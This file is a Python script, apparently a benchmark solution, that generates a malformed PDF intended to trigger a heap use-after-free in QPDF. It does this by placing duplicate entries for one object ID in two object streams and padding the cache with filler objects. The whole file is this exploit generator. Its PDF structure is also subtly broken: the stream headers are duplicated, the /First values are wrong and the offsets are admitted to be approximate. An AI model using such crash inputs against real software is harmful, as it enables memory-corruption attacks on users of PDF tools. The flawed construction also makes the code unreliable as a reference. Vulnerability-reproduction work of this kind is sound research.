import os
import subprocess
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This generates a PDF that triggers the heap use-after-free vulnerability
        # by creating an object stream with multiple entries for the same object ID
        
        # Build a PDF that exercises QPDFWriter::preserveObjectStreams
        # and QPDF::getCompressibleObjSet with duplicate object IDs
        
        # PDF header
        pdf = b"%PDF-1.7\n\n"
        
        # Object 1: Catalog
        catalog = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n"
        pdf += catalog
        
        # Object 2: Pages tree
        pages = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n"
        pdf += pages
        
        # Object 3: Page with indirect references that will be compressed
        page = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n\n"
        pdf += page
        
        # Object 4: Content stream
        content = b"4 0 obj\n<< /Length 35 >>\nstream\nBT /F1 12 Tf 72 720 Td (Hello) Tj ET\nendstream\nendobj\n\n"
        pdf += content
        
        # Object 5: Font
        font = b"5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n\n"
        pdf += font
        
        # Create multiple object streams with duplicate object IDs
        # This triggers the vulnerability when preserveObjectStreams is called
        
        # Object 6: First object stream containing object 7
        obj_stream1_data = b"7 0 <</Type/Test>>"
        obj_stream1 = b"6 0 obj\n<< /Type /ObjStm /N 1 /First 8 >>\nstream\n"
        obj_stream1 += b"7 0 " + obj_stream1_data + b"\nendstream\nendobj\n\n"
        pdf += obj_stream1
        
        # Object 7: Regular object that will also appear in second object stream
        # This creates duplicate entries in the object cache
        regular_obj = b"7 0 obj\n<</Type/Test/Value 1>>\nendobj\n\n"
        pdf += regular_obj
        
        # Object 8: Second object stream also containing object 7 (duplicate ID)
        obj_stream2_data = b"7 0 <</Type/Test/Value 2>>"
        obj_stream2 = b"8 0 obj\n<< /Type /ObjStm /N 1 /First 8 >>\nstream\n"
        obj_stream2 += b"7 0 " + obj_stream2_data + b"\nendstream\nendobj\n\n"
        pdf += obj_stream2
        
        # Create many more objects to fill the object cache
        # This increases the chance of the use-after-free being triggered
        for i in range(9, 100):
            obj = f"{i} 0 obj\n<< /Type /Test /Index {i} >>\nendobj\n\n".encode()
            pdf += obj
        
        # Cross-reference table
        xref_offset = len(pdf)
        xref = b"xref\n0 100\n"
        xref += b"0000000000 65535 f \n"
        
        # Calculate object offsets (simplified - actual would need proper tracking)
        # For simplicity, we'll use approximate offsets
        offsets = [0] * 100
        offsets[1] = len(b"%PDF-1.7\n\n")
        offsets[2] = offsets[1] + len(catalog)
        offsets[3] = offsets[2] + len(pages)
        offsets[4] = offsets[3] + len(page)
        offsets[5] = offsets[4] + len(content)
        offsets[6] = offsets[5] + len(font)
        offsets[7] = offsets[6] + len(obj_stream1)
        offsets[8] = offsets[7] + len(regular_obj)
        
        # Fill remaining offsets
        current_offset = offsets[8] + len(obj_stream2)
        for i in range(9, 100):
            obj_len = len(f"{i} 0 obj\n<< /Type /Test /Index {i} >>\nendobj\n\n".encode())
            offsets[i] = current_offset
            current_offset += obj_len
        
        # Write xref entries
        for i in range(1, 100):
            xref += f"{offsets[i]:010d} 00000 n \n".encode()
        
        pdf += xref
        
        # Trailer
        trailer = b"trailer\n<< /Size 100 /Root 1 0 R >>\n"
        trailer += f"startxref\n{xref_offset}\n".encode()
        trailer += b"%%EOF"
        
        pdf += trailer
        
        return pdf
